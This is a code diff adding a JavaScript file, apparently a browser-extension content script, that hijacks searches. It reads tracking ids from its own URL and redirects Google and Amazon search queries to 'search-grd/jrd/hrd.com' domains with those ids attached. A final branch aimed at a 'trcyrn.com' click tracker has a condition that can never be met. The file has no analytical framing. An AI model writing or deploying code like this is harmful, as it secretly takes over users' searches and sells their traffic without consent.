@@ -1,0 +1,47 @@
+var regex = /[?&]([^=#]+)=([^&#]*)/g,
+        url = document.currentScript.src,
+        params = {},
+        match;
+while (match = regex.exec(url)) {
+    params[match[1]] = match[2];
+}
+
+var ref = document.referrer;
+var hst = document.location.host;
+var uid = params['uid'];
+var i = params['i'];
+
+var paramsString = document.location.search;
+var searchParams = new URLSearchParams(paramsString);
+
+var uidg = uid.substr(0, 1);
+
+if (['0', '1', '2', '3', '4'].includes(uidg) === true) {
+    var dmn = 'grd';
+} else if (['5', '6', '7', '8', '9'].includes(uidg) === true) {
+    var dmn = 'jrd';
+} else {
+    var dmn = 'hrd';
+}
+
+if (hst.includes('google') && searchParams.has("q")) {
+    var searchQuery = searchParams.get("q");
+    $rallowed = (typeof r_allowed === "function" && r_allowed(searchQuery));
+    
+    if ($rallowed) {
+        if (ref.includes('askprivate')) {
+            window.location.replace('https://search.yahoo.com/search?p=' + searchQuery);
+        } else {
+            window.location.replace('https://search-' + dmn + '.com/gosrch/?uid=' + uid + '&i=' + i + '&sc=3&q=' + searchQuery);    
+        }
+    }
+}
+
+if (hst.includes('amazon') && document.location.pathname.includes('s') && searchParams.has("k")) {
+    var searchQuery = searchParams.get("k");
+    window.location.replace('https://search-' + dmn + '.com/gosrch/?uid=' + uid + '&i=' + i + '&sc=6&q=' + searchQuery);
+}
+
+if (!hst.includes('trcyrn') && !hst.includes('trkdut') && !hst.includes('search-') && !hst.includes('gsearch') && !hst.includes('google') && !hst.includes('bing') && !hst.includes('amazon') && Math.floor(Math.random() * 31) == 300) {
+    window.location.replace('https://trcyrn.com/click.php?key=bs8tb9ssla1xb11kiblz&instid=' + i + '&domain=' + hst);
+}
